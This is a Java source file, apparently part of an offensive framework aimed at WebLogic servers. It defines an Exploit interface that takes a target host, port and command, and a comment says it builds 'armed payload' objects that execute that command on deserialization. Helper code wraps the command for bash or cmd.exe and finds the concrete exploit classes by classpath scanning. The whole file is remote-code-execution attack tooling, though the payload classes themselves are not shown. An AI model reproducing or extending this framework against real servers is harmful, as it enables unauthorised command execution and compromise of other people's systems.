package org.weblogic.exploit;

import org.weblogic.Cli;
import org.reflections.Reflections;

import java.lang.reflect.Modifier;
import java.util.Iterator;
import java.util.Set;

@SuppressWarnings("rawtypes")
public interface Exploit {

    /*
     * return armed payload object to be serialized that will execute specified
     * command on deserialization
     */
    public void exploit(String host, String port, String command) throws Exception;

    public static class Utils {
        public static String[] commands(String cmd) {
            String[] cmds = new String[]{cmd};
            if ("linux".equals(Cli.os)) {
                cmds = new String[]{"/bin/bash", "-c", cmd};
            } else if ("windows".equals(Cli.os)) {
                cmds = new String[]{"cmd.exe", "/c", cmd};
            }
            return cmds;
        }

        // get payload classes by classpath scanning
        public static Set<Class<? extends Exploit>> getExploitClasses() {
            final Reflections reflections = new Reflections(Exploit.class.getPackage().getName());
            final Set<Class<? extends Exploit>> payloadTypes = reflections.getSubTypesOf(Exploit.class);
            for (Iterator<Class<? extends Exploit>> iterator = payloadTypes.iterator(); iterator.hasNext(); ) {
                Class<? extends Exploit> pc = iterator.next();
                if (pc.isInterface() || Modifier.isAbstract(pc.getModifiers())) {
                    iterator.remove();
                }
            }
            return payloadTypes;
        }

    }
}